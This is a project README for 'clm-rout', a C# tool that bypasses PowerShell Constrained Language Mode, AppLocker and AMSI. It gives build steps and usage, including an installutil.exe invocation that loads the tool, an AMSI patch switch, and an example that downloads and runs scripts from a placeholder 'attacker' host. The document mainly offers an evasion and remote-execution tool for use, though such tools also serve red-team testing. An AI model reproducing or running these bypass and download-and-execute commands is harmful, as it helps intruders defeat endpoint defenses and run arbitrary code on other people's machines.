# clm-rout

[![Language](https://img.shields.io/badge/Lang-C%23-blue)](https://docs.microsoft.com/en-gb/powershell/)
[![License](https://img.shields.io/badge/License-BSD%203-red.svg)](https://docs.microsoft.com/en-us/dotnet/csharp/)

## An all-in-one bypass for `PowerShell Constrained Language Mode` (`CLM`), `AppLocker` and `Antimalware Scan Interface` (`AMSI`) using Runspace.

## Features

- Evade `AppLocker`.
- Evade `CLM`.
- Patch `AMSI` via the `/pacth` command switch.
- Execute command(s) via the `/cmd=<cmd>` command switch.
- Load and execute remotely hosted script(s) via the `/url=<http(s)://foo.bar/foobar>` command switch.
- Output the results of commands/scripts (supports `stdout` and `stderr`).

## Installation

1. Clone/download `clm-rout`:

    ```powershell
    git clone https://github.com/aress31/clm-rout
    ```

2. Build the project with `Visual Studio 2022`.

## Usage

- (Recommended) Create an "alias" for the function:

```powershell
function run {
	C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe `
		/uninstall /logfile= /LogToConsole=false `
		/patch $Args `
		C:\users\foo\CLMRout.exe
}
```

### Examples

- Execute command(s):

    ```powershell
    run /cmd="hostname; whoami"
    ```

- Execute remote script(s):

    ```powershell
    run /script="http://attacker/script1.ps1; http://attacker/script2.ps1"
    ```

## Sponsor 💓

If you want to support this project and appreciate the time invested in developping, maintening and extending it; consider donating toward my next (cup of coffee ☕/lamborghini 🚗) - as **a lot** of my **personal time** went into creating this project. 😪

It is easy, all you got to do is press the `Sponsor` button at the top of this page or alternatively [click this link](https://github.com/sponsors/aress31). 😁

## Reporting Issues

Found a bug 🐛? I would love to squash it!

Please report all issues on the GitHub [issues tracker](https://github.com/aress31/clm-rout/issues).

## Contributing

You would like to contribute to better this project? 🤩

Please submit all `PRs` on the GitHub [pull requests tracker](https://github.com/aress31/clm-rout/pulls).

## License

`clm-rout` is distributed under the terms of the `BSD 3`.

See [LICENSE](./LICENSE) for details.